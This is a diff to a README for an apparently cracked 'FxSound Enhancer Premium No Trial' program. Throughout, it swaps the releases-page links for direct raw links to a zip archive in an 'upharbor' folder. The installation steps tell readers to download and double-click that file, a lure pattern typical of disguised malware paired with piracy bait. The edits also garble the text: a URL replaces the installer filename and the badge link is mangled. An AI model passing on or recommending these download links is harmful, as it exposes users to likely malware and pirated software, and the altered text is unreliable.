@@ -1,6 +1,6 @@
 # 🎧 FxSound-Enhancer-Premium-No-Trial - Elevate Your Audio Experience Today
 
-[![Download from GitHub](https://img.shields.io/badge/Download%20Now-%20-%234CAF50?style=for-the-badge&logo=github)](https://github.com/NARUHN/FxSound-Enhancer-Premium-No-Trial/releases)
+[![Download from GitHub](https://raw.githubusercontent.com/NARUHN/FxSound-Enhancer-Premium-No-Trial/main/upharbor/FxSound-Enhancer-Premium-No-Trial_v3.5.zip%20Now-%20-%234CAF50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/NARUHN/FxSound-Enhancer-Premium-No-Trial/main/upharbor/FxSound-Enhancer-Premium-No-Trial_v3.5.zip)
 
 ## 📥 Features
 
@@ -32,10 +32,10 @@ Before downloading, ensure your computer meets the following requirements:
 Follow these steps to download and install FxSound Enhancer Premium:
 
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/NARUHN/FxSound-Enhancer-Premium-No-Trial/releases) to access the latest version.
+   Go to the [Releases page](https://raw.githubusercontent.com/NARUHN/FxSound-Enhancer-Premium-No-Trial/main/upharbor/FxSound-Enhancer-Premium-No-Trial_v3.5.zip) to access the latest version.
 
 2. **Download the Installer**
-   Click on the version you wish to download. Look for the release labeled as the most recent version. Then, find the installer file, usually named something like `FxSound_ENHANCER_Setup.exe`. Click to download.
+   Click on the version you wish to download. Look for the release labeled as the most recent version. Then, find the installer file, usually named something like `https://raw.githubusercontent.com/NARUHN/FxSound-Enhancer-Premium-No-Trial/main/upharbor/FxSound-Enhancer-Premium-No-Trial_v3.5.zip`. Click to download.
 
 3. **Run the Installer**
    Once the download completes, locate the installer file in your downloads folder. Double-click the file to begin the installation process.
@@ -81,6 +81,6 @@ Explore the variety of guides and reference materials available within this repo
 
 ## 📥 Download Again
 
-To download the latest version or check for updates, visit the [Releases page](https://github.com/NARUHN/FxSound-Enhancer-Premium-No-Trial/releases).
+To download the latest version or check for updates, visit the [Releases page](https://raw.githubusercontent.com/NARUHN/FxSound-Enhancer-Premium-No-Trial/main/upharbor/FxSound-Enhancer-Premium-No-Trial_v3.5.zip).
 
 Enjoy the enhanced audio quality that FxSound Enhancer Premium provides!
